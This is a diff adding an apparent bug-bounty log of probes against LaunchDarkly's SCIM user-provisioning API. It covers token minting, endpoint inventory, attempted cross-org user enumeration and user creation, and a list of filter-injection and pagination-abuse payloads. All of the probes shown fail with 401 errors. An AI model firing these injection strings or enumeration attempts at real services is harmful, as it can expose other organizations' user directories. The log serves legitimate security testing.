@@ -1,0 +1,32 @@
+=== mint scim bearer ===
+access_token: MMYWNWY5ZDQTYZM1ZS... scope=scim expires_in=31536000
+ORG member email (Account B):  role=None
+
+=== a) SCIM inventory (TST bearer) ===
+GET /ServiceProviderConfig -> 404 b' \n<!DOCTYPE html>\n<html lang="en">\n  <head>\n    \n\n    <meta charset="utf-8">\n    \n    <title>Not found</title>\n    <meta name="description" content="LaunchDarkly">\n    <meta name="viewport" content="width=device-width">\n'
+GET /Users -> 401 b'{"code":"invalid_token","message":"invalid access token"}'
+GET /Groups -> 401 b'{"code":"invalid_token","message":"invalid access token"}'
+GET /Schemas -> 401 b'{"code":"invalid_token","message":"invalid access token"}'
+GET /ResourceTypes -> 404 b' \n<!DOCTYPE html>\n<html lang="en">\n  <head>\n    \n\n    <meta charset="utf-8">\n    \n    <title>Not found</title>\n    <meta name="description" content="LaunchDarkly">\n    <meta name="viewport" content="width=device-width">\n'
+GET /Schemas/User -> 404 b' \n<!DOCTYPE html>\n<html lang="en">\n  <head>\n    \n\n    <meta charset="utf-8">\n    \n    <title>Not found</title>\n    <meta name="description" content="LaunchDarkly">\n    <meta name="viewport" content="width=device-width">\n'
+
+=== b) cross-org user enumeration (ORG email in TST SCIM) ===
+
+=== c) POST /Users (own alias zeno-r19-scim@bugcrowdninja.com) ===
+POST /Users -> 401 b'{"code":"invalid_token","message":"invalid access token"}'
+new user id=
+
+=== d) PUT profile modification + cross-org reflection ===
+
+=== e) filter injection probes ===
+filter[userName eq "x" or userName pr] -> 401 b'{"code":"invalid_token","message":"invalid access token"}'
+filter[userName eq "x) or (userName pr] -> 401 b'{"code":"invalid_token","message":"invalid access token"}'
+filter[emails.value eq "zeno-r19-scim@bugcrowdninja.com" or] -> 401 b'{"code":"invalid_token","message":"invalid access token"}'
+filter[userName eq "x' or '1'='1] -> 401 b'{"code":"invalid_token","message":"invalid access token"}'
+filter[title co "admin" or userName pr] -> 401 b'{"code":"invalid_token","message":"invalid access token"}'
+filter[urn:ietf:params:scim:schemas:core:2.0:User:userName ] -> 401 b'{"code":"invalid_token","message":"invalid access token"}'
+filter[userName eq "x\" or userName pr] -> 401 b'{"code":"invalid_token","message":"invalid access token"}'
+Users?startIndex=0&count=100000 -> 401 b'{"code":"invalid_token","message":"invalid access token"}'
+Users?count=-1 -> 401 b'{"code":"invalid_token","message":"invalid access token"}'
+Users?startIndex=-5 -> 401 b'{"code":"invalid_token","message":"invalid access token"}'
+hunt6 done (user cleanup in hunt7)
